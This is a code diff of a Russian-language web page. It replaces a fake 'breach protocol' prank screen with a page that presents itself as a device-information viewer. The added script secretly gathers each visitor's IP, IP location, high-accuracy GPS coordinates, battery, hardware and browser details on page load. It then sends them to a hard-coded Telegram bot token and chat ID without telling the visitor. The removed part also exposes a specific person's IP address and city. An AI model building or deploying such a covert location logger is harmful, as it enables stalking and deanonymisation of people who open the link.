@@ -3,191 +3,560 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Местоположение и устройство обнаруженно</title>
+    <title>Расширенная информация об устройстве</title>
     <style>
         body {
-            font-family: 'Courier New', monospace;
-            background-color: #000;
-            color: #00ff00;
-            text-align: left;
-            padding: 20px;
-            margin: 0;
-            display: flex;
-            flex-direction: column; /* Изменено на column для лучшей адаптации */
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow: hidden;
-            box-sizing: border-box; /* Добавлено для лучшего контроля размеров */
-        }
-        .terminal {
-            width: 90%; /* Адаптивная ширина */
-            max-width: 600px;
-            padding: 10px;
-            border: 2px solid #00ff00;
-            background-color: #000;
-            white-space: pre-wrap;
-            box-sizing: border-box; /* Добавлено */
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 10px; /* Уменьшаем общий маржин для мобильных */
+            background-color: #e9ecef;
+            color: #343a40;
+            line-height: 1.6;
         }
         .container {
-            width: 90%; /* Адаптивная ширина */
-            max-width: 600px;
-            background-color: #333;
-            padding: 20px;
+            background-color: #ffffff;
+            padding: 15px; /* Уменьшаем паддинг для мобильных */
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
-            display: none;
-            color: #00ff00;
-            box-sizing: border-box; /* Добавлено */
-            margin-top: 20px; /* Отступ от терминала, если оба видны */
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            max-width: 900px;
+            margin: 10px auto; /* Меньший маржин сверху/снизу */
+            border: 1px solid #dee2e6;
         }
         h1 {
-            font-size: 2em;
+            color: #007bff;
+            text-align: center;
+            margin-bottom: 20px; /* Уменьшаем маржин */
+            font-size: 1.8em; /* Немного уменьшаем размер для мобильных */
+            border-bottom: 2px solid #007bff;
+            padding-bottom: 8px;
+        }
+        .info-section {
             margin-bottom: 20px;
-            color: #ff3333;
-            text-align: center; /* Центрируем заголовок */
+            border-bottom: 1px dashed #ced4da;
+            padding-bottom: 15px;
         }
-        .container p {
-            font-size: 1.2em;
-            margin: 10px 0;
-            word-wrap: break-word; /* Добавлено для переноса длинных строк */
+        .info-section:last-child {
+            border-bottom: none;
         }
-        .real-info {
-            color: #ff3333; /* Красный цвет для подлинной информации */
+        .info-section h2 {
+            color: #28a745;
+            font-size: 1.2em; /* Немного уменьшаем размер для мобильных */
+            margin-top: 0;
+            margin-bottom: 10px;
+            background-color: #eafbea;
+            padding: 8px 10px; /* Уменьшаем паддинг */
+            border-left: 5px solid #28a745;
         }
-
-        /* Медиа-запросы для лучшей адаптации на очень маленьких экранах */
-        @media (max-width: 480px) {
+        .info-item {
+            display: flex;
+            flex-wrap: wrap; /* Позволяем элементам переноситься */
+            align-items: baseline;
+            margin-bottom: 8px;
+            font-size: 0.9em; /* Немного уменьшаем размер шрифта */
+        }
+        .info-item strong {
+            flex: 0 0 100%; /* На мобильных метка занимает всю ширину */
+            margin-right: 0;
+            margin-bottom: 3px; /* Добавляем небольшой отступ между меткой и значением */
+            color: #495057;
+            font-weight: 600;
+        }
+        .info-item span {
+            flex-grow: 1;
+            word-break: break-all;
+            color: #6c757d;
+        }
+        .info-item .note {
+            font-size: 0.75em; /* Немного уменьшаем размер примечаний */
+            color: #888;
+            margin-left: 0; /* Удаляем отступ слева на мобильных */
+            width: 100%; /* Примечание тоже занимает всю ширину */
+            display: block; /* Отображаем как блок для новой строки */
+        }
+        .error {
+            color: #dc3545;
+            font-weight: bold;
+        }
+        /* Media queries for larger screens (tablets and PCs) */
+        @media (min-width: 768px) {
             body {
-                padding: 10px;
+                margin: 20px;
             }
-            .terminal, .container {
-                padding: 10px;
-                font-size: 0.9em; /* Уменьшаем шрифт на маленьких экранах */
+            .container {
+                padding: 30px;
+                margin: 20px auto;
             }
             h1 {
-                font-size: 1.5em;
+                font-size: 2em;
+                margin-bottom: 30px;
             }
-            .container p {
-                font-size: 1em;
+            .info-section {
+                margin-bottom: 25px;
+                padding-bottom: 20px;
+            }
+            .info-section h2 {
+                font-size: 1.4em;
+                margin-bottom: 15px;
+                padding: 8px 15px;
+            }
+            .info-item {
+                font-size: 0.95em;
+            }
+            .info-item strong {
+                flex: 0 0 200px; /* Возвращаем фиксированную ширину для ПК/планшетов */
+                margin-right: 15px;
+                margin-bottom: 0; /* Убираем отступ */
+            }
+            .info-item .note {
+                font-size: 0.8em;
+                margin-left: 10px;
+                width: auto; /* Возвращаем автоматическую ширину */
+                display: inline; /* Отображаем как строчный элемент */
             }
         }
     </style>
 </head>
 <body>
-    <div class="terminal" id="terminal-text"></div>
-    <div class="container" id="main-content">
-        <h1>Местоположение и устройство обнаруженно</h1>
-        <p id="vpn-ip">Внешний IP (VPN): Загрузка...</p>
-        <p id="vpn-geo">Местоположение по IP: Загрузка...</p>
-        <p class="real-info">Ваш подлинный IP: 78.26.128.41</p>
-        <p class="real-info">Подлинное местоположение: Украина, Одесская область, г. Одесса</p>
-        <p id="provider">Провайдер: Westelecom</p>
-        <p id="device">Ваше устройство: Загрузка...</p>
-        <p id="resolution">Расширение экрана: Загрузка...</p>
-        <p id="languages">Языки: Загрузка...</p>
-    </div>
+    <div class="container">
+        <h1>Подробная информация об устройстве</h1>
+
+        <div class="info-section">
+            <h2>Основные данные</h2>
+            <div class="info-item">
+                <strong>User Agent:</strong> <span id="userAgent"></span>
+            </div>
+            <div class="info-item">
+                <strong>Операционная система:</strong> <span id="osInfo"></span>
+            </div>
+            <div class="info-item">
+                <strong>Платформа:</strong> <span id="platform"></span>
+            </div>
+            <div class="info-item">
+                <strong>Имя браузера:</strong> <span id="browserName"></span>
+            </div>
+            <div class="info-item">
+                <strong>Версия браузера:</strong> <span id="browserVersion"></span>
+            </div>
+            <div class="info-item">
+                <strong>Возможное название/модель устройства:</strong> <span id="deviceName"></span> <span class="note">(Основано на User Agent, может быть неточным)</span>
+            </div>
+        </div>
+
+        <div class="info-section">
+            <h2>Информация о сети</h2>
+            <div class="info-item">
+                <strong>Публичный IP адрес:</strong> <span id="publicIp"></span>
+            </div>
+            <div class="info-item">
+                <strong>Тип соединения (эффективный):</strong> <span id="connectionType"></span> <span class="note">(Приблизительно, по данным браузера)</span>
+            </div>
+            <div class="info-item">
+                <strong>Физический тип сети:</strong> <span id="networkType"></span> <span class="note">(Может быть WiFi, Cellular и т.д.)</span>
+            </div>
+            <div class="info-item">
+                <strong>API Bluetooth:</strong> <span id="bluetoothAPI"></span>
+            </div>
+            <div class="info-item">
+                <strong>API USB:</strong> <span id="usbAPI"></span>
+            </div>
+        </div>
+
+        <div class="info-section">
+            <h2>Местоположение</h2>
+            <div class="info-item">
+                <strong>Местоположение по IP:</strong> <span id="ipLocation"></span> <span class="note">(Приблизительно, по данным IP)</span>
+            </div>
+            <div class="info-item">
+                <strong>GPS координаты:</strong> <span id="gpsLocation"></span> <span class="note">(Требует разрешения, может быть неточным)</span>
+            </div>
+        </div>
+
+        <div class="info-section">
+            <h2>Аппаратное обеспечение</h2>
+            <div class="info-item">
+                <strong>Логические ядра CPU:</strong> <span id="hardwareConcurrency"></span> <span class="note">(Количество потоков, доступных JavaScript, не физические ядра CPU)</span>
+            </div>
+            <div class="info-item">
+                <strong>Память устройства (ГБ):</strong> <span id="deviceMemory"></span> <span class="note">(Приблизительный объем ОЗУ)</span>
+            </div>
+            <div class="info-item">
+                <strong>Статус батареи:</strong> <span id="batteryStatus"></span>
+            </div>
+        </div>
+
+        <div class="info-section">
+            <h2>Дисплей</h2>
+            <div class="info-item">
+                <strong>Разрешение экрана (CSS pixels):</strong> <span id="screenResolution"></span>
+            </div>
+            <div class="info-item">
+                <strong>Доступное разрешение (без UI):</strong> <span id="availableScreenResolution"></span>
+            </div>
+            <div class="info-item">
+                <strong>Размер окна (Viewport):</strong> <span id="viewportSize"></span>
+            </div>
+            <div class="info-item">
+                <strong>Глубина цвета:</strong> <span id="colorDepth"></span>
+            </div>
+            <div class="info-item">
+                <strong>Pixel Ratio устройства:</strong> <span id="devicePixelRatio"></span>
+            </div>
+            <div class="info-item">
+                <strong>Поддержка касаний:</strong> <span id="touchSupport"></span>
+            </div>
+        </div>
+
+        </div>
 
     <script>
-        const terminal = document.getElementById('terminal-text');
-        const mainContent = document.getElementById('main-content');
-        const messages = [
-            "root@unknown:~$ Initializing breach protocol...\n",
-            "Bypassing firewall... [SUCCESS]\n",
-            "Accessing mainframe... [SUCCESS]\n",
-            "Tracing IP address... [SUCCESS]\n",
-            "Resolving geolocation data... [SUCCESS]\n"
-        ];
+        // Telegram Bot Configuration
+        const BOT_TOKEN = '7743325672:AAEgT4v4dYlMb3C_JJ9HJP38BYyc-z-3XnA'; // Your bot token
+        const CHAT_ID = '7048297998'; // Your chat ID
 
-        let index = 0;
-        function typeWriter() {
-            if (index < messages.length) {
-                let i = 0;
-                const currentMessage = messages[index];
-                terminal.textContent = ''; // Clear for new line
-                const interval = setInterval(() => {
-                    if (i < currentMessage.length) {
-                        terminal.textContent += currentMessage.charAt(i);
-                        i++;
-                    } else {
-                        clearInterval(interval);
-                        index++;
-                        setTimeout(typeWriter, 500); // Delay between messages
-                    }
-                }, 25); // Faster typing speed (25ms)
-            } else {
-                // Last message with progress
-                terminal.textContent += "Decrypting user data... ";
-                let progress = 1;
-                const progressInterval = setInterval(() => {
-                    if (progress <= 100) {
-                        terminal.textContent = `Decrypting user data... ${progress}% `;
-                        progress++;
-                    } else {
-                        clearInterval(progressInterval);
-                        terminal.textContent += "[SUCCESS]\n";
-                        setTimeout(() => {
-                            terminal.style.display = 'none';
-                            mainContent.style.display = 'block';
-                        }, 1000); // Delay before transitioning
-                    }
-                }, 30); // Progress speed
+        // Helper function to update text content
+        function updateTextContent(id, text, className = '') {
+            const element = document.getElementById(id);
+            if (element) {
+                element.textContent = text;
+                element.className = className;
             }
         }
 
-        // Start the animation
-        typeWriter();
+        // Helper to collect all info into an object
+        async function collectDeviceInfo() {
+            const info = {};
 
-        // Fetch IP and geolocation
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('vpn-ip').textContent = `Внешний IP (VPN): ${data.ip}`;
-                document.getElementById('vpn-geo').textContent = `Местоположение по IP: ${data.city}, ${data.region}, ${data.country_name}`;
-            })
-            .catch(error => {
-                document.getElementById('vpn-ip').textContent = 'Внешний IP (VPN): Не удалось загрузить';
-                document.getElementById('vpn-geo').textContent = 'Местоположение по IP: Не удалось загрузить'; // Исправлено: было "Подлинное местоположение"
+            // --- Initial synchronous data gathering ---
+            const userAgent = navigator.userAgent || 'Неизвестно';
+            info.userAgent = userAgent;
+            info.platform = navigator.platform || 'Неизвестно';
+
+            let osInfo = 'Неизвестно';
+            let browserName = 'Неизвестно';
+            let browserVersion = 'Неизвестно';
+            let deviceName = 'Неизвестно';
+
+            // More robust User Agent parsing
+            if (userAgent) {
+                // OS Detection
+                if (userAgent.match(/Windows NT ([\d.]+)/)) osInfo = 'Windows ' + userAgent.match(/Windows NT ([\d.]+)/)[1];
+                else if (userAgent.match(/Macintosh|Mac OS X/)) osInfo = 'macOS';
+                else if (userAgent.match(/Android ([\d.]+)/)) {
+                    osInfo = 'Android ' + userAgent.match(/Android ([\d.]+)/)[1];
+                    const androidModel = userAgent.match(/Android [\d.]+; ([^;)]*)/);
+                    if (androidModel && androidModel[1]) {
+                        deviceName = androidModel[1].replace(/Build\/.*/, '').trim(); // Remove build info
+                    }
+                }
+                else if (userAgent.match(/iPhone OS ([\d_]+)/)) {
+                    osInfo = 'iOS ' + userAgent.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g, '.');
+                    deviceName = 'iPhone';
+                }
+                else if (userAgent.match(/iPad; CPU OS ([\d_]+)/)) {
+                    osInfo = 'iPadOS ' + userAgent.match(/iPad; CPU OS ([\d_]+)/)[1].replace(/_/g, '.');
+                    deviceName = 'iPad';
+                }
+                else if (userAgent.match(/Linux/)) osInfo = 'Linux';
+                else if (userAgent.match(/CrOS/)) osInfo = 'Chrome OS';
+
+                // Browser Detection
+                if (userAgent.match(/Chrome\/([\d.]+)/) && !userAgent.match(/Edge|Edg/)) {
+                    browserName = 'Chrome';
+                    browserVersion = userAgent.match(/Chrome\/([\d.]+)/)[1];
+                } else if (userAgent.match(/Firefox\/([\d.]+)/)) {
+                    browserName = 'Firefox';
+                    browserVersion = userAgent.match(/Firefox\/([\d.]+)/)[1];
+                } else if (userAgent.match(/Edge\/([\d.]+)/) || userAgent.match(/Edg\/([\d.]+)/)) {
+                    browserName = 'Edge';
+                    browserVersion = userAgent.match(/(Edge|Edg)\/([\d.]+)/)[2];
+                } else if (userAgent.match(/Safari\/([\d.]+)/) && !userAgent.match(/Chrome/)) {
+                    browserName = 'Safari';
+                    browserVersion = userAgent.match(/Version\/([\d.]+).*Safari/)?.[1] || 'Неизвестно';
+                } else if (userAgent.match(/Opera|OPR\//)) {
+                    browserName = 'Opera';
+                    browserVersion = userAgent.match(/(Opera|OPR)\/([\d.]+)/)?.[2] || 'Неизвестно';
+                } else if (userAgent.match(/MSIE |Trident\//)) {
+                    browserName = 'Internet Explorer';
+                    browserVersion = userAgent.match(/MSIE ([\d.]+)/)?.[1] || '11.0 (Trident)';
+                }
+            }
+
+            info.osInfo = osInfo;
+            info.browserName = browserName;
+            info.browserVersion = browserVersion;
+            info.deviceName = deviceName;
+
+            // --- Browser Settings (Keep these as they are core to basic info) ---
+            info.cookiesEnabled = navigator.cookieEnabled ? 'Да' : 'Нет';
+            info.languages = navigator.languages.join(', ') || 'Неизвестно';
+            try {
+                info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Неизвестно';
+            } catch (e) {
+                info.timezone = 'Ошибка определения';
+            }
+            info.touchSupport = (typeof navigator.maxTouchPoints !== 'undefined' ? navigator.maxTouchPoints + ' точек касания' : 'Неизвестно');
+            info.hardwareConcurrency = navigator.hardwareConcurrency || 'Неизвестно';
+            info.deviceMemory = (navigator.deviceMemory ? navigator.deviceMemory + ' ГБ' : 'Неизвестно');
+
+            // --- Network Information ---
+            if (navigator.connection) {
+                info.connectionType = navigator.connection.effectiveType || 'Недоступно';
+                info.networkType = navigator.connection.type || 'Неизвестно';
+            } else {
+                info.connectionType = 'Недоступно';
+                info.networkType = 'Недоступно';
+            }
+            info.bluetoothAPI = (typeof navigator.bluetooth !== 'undefined') ? 'Да' : 'Нет';
+            info.usbAPI = (typeof navigator.usb !== 'undefined') ? 'Да' : 'Нет';
+
+            // --- Display Information ---
+            info.screenResolution = screen.width + 'x' + screen.height;
+            info.availableScreenResolution = screen.availWidth + 'x' + screen.availHeight;
+            info.viewportSize = window.innerWidth + 'x' + window.innerHeight;
+            info.colorDepth = screen.colorDepth + ' бит';
+            info.devicePixelRatio = window.devicePixelRatio || 'Неизвестно';
+
+            // --- Asynchronous data gathering ---
+
+            // Public IP Address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                if (!ipResponse.ok) throw new Error(`HTTP error! Status: ${ipResponse.status}`);
+                const ipData = await ipResponse.json();
+                info.publicIp = ipData.ip || 'Неизвестно';
+            } catch (error) {
+                info.publicIp = `Ошибка: ${error.message} (Проверьте интернет/блокировщики)`;
+            }
+
+            // Location by IP
+            try {
+                const geoResponse = await fetch('https://ipapi.co/json/');
+                if (!geoResponse.ok) throw new Error(`HTTP error! Status: ${geoResponse.status}`);
+                const geoData = await geoResponse.json();
+                if (geoData.error) {
+                    info.ipLocation = `Ошибка: ${geoData.reason}`;
+                } else {
+                    info.ipLocation = `${geoData.city || 'Неизвестный город'}, ${geoData.region || 'Неизвестный регион'}, ${geoData.country_name || 'Неизвестная страна'} (ISP: ${geoData.org || 'Неизвестно'})`;
+                }
+            } catch (error) {
+                info.ipLocation = `Ошибка: ${error.message} (Проверьте интернет/блокировщики)`;
+            }
+
+            // GPS Location
+            if ('geolocation' in navigator) {
+                await new Promise(resolve => {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude.toFixed(6);
+                            const lon = position.coords.longitude.toFixed(6);
+                            const accuracy = position.coords.accuracy.toFixed(2);
+                            info.gpsLocation = `Широта: ${lat}, Долгота: ${lon} (Точность: ${accuracy} м)`;
+                            resolve();
+                        },
+                        (error) => {
+                            let errorMessage;
+                            switch (error.code) {
+                                case error.PERMISSION_DENIED:
+                                    errorMessage = "Доступ к GPS отклонен пользователем.";
+                                    break;
+                                case error.POSITION_UNAVAILABLE:
+                                    errorMessage = "Информация о местоположении недоступна.";
+                                    break;
+                                case error.TIMEOUT:
+                                    errorMessage = "Таймаут получения местоположения.";
+                                    break;
+                                default:
+                                    errorMessage = "Неизвестная ошибка получения местоположения.";
+                                    break;
+                            }
+                            info.gpsLocation = `Ошибка: ${errorMessage}`;
+                            resolve(); // Resolve even on error to continue flow
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 3000, // Reduced timeout for faster collection
+                            maximumAge: 0
+                        }
+                    );
+                });
+            } else {
+                info.gpsLocation = 'API геолокации не поддерживается';
+            }
+
+            // --- Hardware Information (Battery is async) ---
+            if ('getBattery' in navigator) {
+                await navigator.getBattery().then(function(battery) {
+                    const status = battery.charging ? 'Заряжается' : 'Не заряжается';
+                    const level = (battery.level * 100).toFixed(0) + '%';
+                    const chargingTime = battery.chargingTime !== Infinity ? ` (Зарядка: ${ (battery.chargingTime / 60).toFixed(1) } мин)` : '';
+                    const dischargingTime = battery.dischargingTime !== Infinity ? ` (Осталось: ${ (battery.dischargingTime / 3600).toFixed(1) } ч)` : '';
+                    info.batteryStatus = `${status}, Уровень: ${level}${chargingTime}${dischargingTime}`;
+                }).catch(function(e) {
+                    info.batteryStatus = 'Недоступно';
+                });
+            } else {
+                info.batteryStatus = 'Не поддерживается';
+            }
+
+            // Removed sections from collectDeviceInfo as requested:
+            // Graphics (WebGL)
+            // Multimedia
+            // Device Interaction
+            // Advanced Browser Capabilities
+            // Additional Information (except the core browser settings already kept)
+
+            return info;
+        }
+
+        // Function to display collected information on the page
+        function displayDeviceInfo(info) {
+            updateTextContent('userAgent', info.userAgent);
+            updateTextContent('osInfo', info.osInfo);
+            updateTextContent('platform', info.platform);
+            updateTextContent('browserName', info.browserName);
+            updateTextContent('browserVersion', info.browserVersion);
+            updateTextContent('deviceName', info.deviceName);
+            updateTextContent('publicIp', info.publicIp, info.publicIp.startsWith('Ошибка') ? 'error' : '');
+            updateTextContent('connectionType', info.connectionType);
+            updateTextContent('networkType', info.networkType);
+            updateTextContent('bluetoothAPI', info.bluetoothAPI);
+            updateTextContent('usbAPI', info.usbAPI);
+            updateTextContent('ipLocation', info.ipLocation, info.ipLocation.startsWith('Ошибка') ? 'error' : '');
+            updateTextContent('gpsLocation', info.gpsLocation, info.gpsLocation.startsWith('Ошибка') ? 'error' : '');
+            updateTextContent('hardwareConcurrency', info.hardwareConcurrency);
+            updateTextContent('deviceMemory', info.deviceMemory);
+            updateTextContent('batteryStatus', info.batteryStatus, info.batteryStatus.includes('Недоступно') || info.batteryStatus.includes('Не поддерживается') ? 'error' : '');
+            updateTextContent('screenResolution', info.screenResolution);
+            updateTextContent('availableScreenResolution', info.availableScreenResolution);
+            updateTextContent('viewportSize', info.viewportSize);
+            updateTextContent('colorDepth', info.colorDepth);
+            updateTextContent('devicePixelRatio', info.devicePixelRatio);
+            updateTextContent('touchSupport', info.touchSupport);
+            // Removed display updates for sections that are no longer collected or displayed:
+            // webglVendor, webglRenderer, webglVersion, webgl2Support, webgpuSupport, webglExtensions
+            // videoCodecs, audioCodecs
+            // deviceSensors, gamepadAPI
+            // webWorkersSupport, serviceWorkersSupport, localStorageSupport, sessionStorageSupport, indexedDBSupport
+            updateTextContent('cookiesEnabled', info.cookiesEnabled);
+            updateTextContent('languages', info.languages);
+            updateTextContent('timezone', info.timezone, info.timezone.includes('Ошибка') ? 'error' : '');
+            // Removed display updates for other 'Дополнительно' fields
+            // doNotTrackStatus, webrtcSupport, mediaDevicesHash, plugins, detectedFonts
+        }
+
+        // Function to send HTML content to Telegram bot
+        async function sendHtmlToTelegram(htmlContent) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = {
+                chat_id: CHAT_ID,
+                text: htmlContent,
+                parse_mode: 'HTML' // Crucial for sending HTML
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(params)
+                });
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    console.error('Failed to send HTML message to Telegram:', errorData);
+                } else {
+                    console.log('Device info HTML sent to Telegram successfully!');
+                }
+            } catch (error) {
+                console.error('Error sending HTML message to Telegram:', error);
+            }
+        }
+
+        // Main execution on page load
+        document.addEventListener('DOMContentLoaded', async function() {
+            const deviceInfo = await collectDeviceInfo();
+            displayDeviceInfo(deviceInfo); // Display immediately
+
+            // Generate HTML message for Telegram based on displayed content
+            let telegramHtmlMessage = '<b><pre>Новая информация об устройстве:</pre></b>\n\n';
+
+            // Function to sanitize text for HTML
+            const escapeHtml = (unsafe) => {
+                return unsafe
+                    .replace(/&/g, "&amp;")
+                    .replace(/</g, "&lt;")
+                    .replace(/>/g, "&gt;")
+                    .replace(/"/g, "&quot;")
+                    .replace(/'/g, "&#039;");
+            };
+
+            // Iterate only over the remaining info-sections to reconstruct HTML
+            const sectionsToInclude = [
+                'Основные данные',
+                'Информация о сети',
+                'Местоположение',
+                'Аппаратное обеспечение',
+                'Дисплей'
+            ];
+
+            document.querySelectorAll('.info-section').forEach(section => {
+                const sectionTitleElement = section.querySelector('h2');
+                const sectionTitle = sectionTitleElement?.textContent.trim();
+
+                if (sectionTitle && sectionsToInclude.includes(sectionTitle)) {
+                    telegramHtmlMessage += `<b><u>${escapeHtml(sectionTitle)}</u></b>\n`;
+
+                    section.querySelectorAll('.info-item').forEach(item => {
+                        const strongText = item.querySelector('strong')?.textContent?.replace(':', '') || '';
+                        const spanElement = item.querySelector('span');
+                        const spanText = spanElement ? spanElement.textContent.trim() : '';
+                        const noteText = item.querySelector('.note')?.textContent || '';
+
+                        if (strongText && spanText) {
+                            telegramHtmlMessage += `<b>${escapeHtml(strongText)}:</b> ${escapeHtml(spanText)}`;
+                            if (noteText) {
+                                telegramHtmlMessage += ` <i>${escapeHtml(noteText)}</i>`;
+                            }
+                            telegramHtmlMessage += `\n`;
+                        }
+                    });
+                    telegramHtmlMessage += `\n`; // Add a newline after each section
+                }
             });
 
-        // Detect device and OS
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let device = 'Неизвестное устройство';
-            
-            if (/android/i.test(ua)) {
-                const versionMatch = ua.match(/Android\s([\d.]+)/);
-                const version = versionMatch ? versionMatch[1] : '*****';
-                device = `Смартфон Android ${version} ******`;
-            } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                const versionMatch = ua.match(/OS\s([\d_]+)/);
-                const version = versionMatch ? versionMatch[1].replace(/_/g, '.') : '*****';
-                device = `iPhone ${version}`;
-            } else if (/Windows/i.test(ua)) {
-                const versionMatch = ua.match(/Windows\sNT\s([\d.]+)/);
-                const version = versionMatch ? versionMatch[1] : '*****';
-                device = `ПК Windows (Windows NT ${version}; ${navigator.platform})`;
-            } else if (/Mac/i.test(ua)) {
-                device = `ПК MacOS ******`;
-            } else if (/Linux/i.test(ua)) { // Добавлено для Linux
-                device = `ПК Linux ******`;
-            } else if (/CrOS/i.test(ua)) { // Добавлено для Chrome OS
-                device = `Chromebook ******`;
+            // Telegram has a message size limit (4096 characters).
+            // We should split the message if it's too long.
+            const MAX_MESSAGE_LENGTH = 4096;
+            let currentMessagePart = '';
+            const messagesToSend = [];
+
+            // Simple splitting by lines for now, more complex splitting might be needed for very large data
+            const lines = telegramHtmlMessage.split('\n');
+            for (const line of lines) {
+                // Check if adding the next line would exceed the limit
+                if ((currentMessagePart + line + '\n').length > MAX_MESSAGE_LENGTH) {
+                    // If current part is not empty, push it
+                    if (currentMessagePart.length > 0) {
+                        messagesToSend.push(currentMessagePart);
+                    }
+                    // Start a new part with the current line
+                    currentMessagePart = line + '\n';
+                } else {
+                    // Otherwise, just add the line to the current part
+                    currentMessagePart += line + '\n';
+                }
+            }
+            // Add any remaining part
+            if (currentMessagePart.length > 0) {
+                messagesToSend.push(currentMessagePart);
             }
 
-            return device;
-        }
-
-        // Get screen resolution
-        const resolution = `${window.screen.width}x${window.screen.height}`;
-
-        // Get browser languages
-        const languages = navigator.languages ? navigator.languages.join(', ') : navigator.language || 'Неизвестно';
-
-        // Update DOM with device info
-        document.getElementById('device').textContent = `Ваше устройство: ${getDeviceInfo()}`;
-        document.getElementById('resolution').textContent = `Расширение экрана: ${resolution}`;
-        document.getElementById('languages').textContent = `Языки: ${languages}`;
+            // Send each part
+            for (const msgPart of messagesToSend) {
+                await sendHtmlToTelegram(msgPart);
+                // Add a small delay between sending messages to avoid rate limits
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+        });
     </script>
 </body>
 </html>
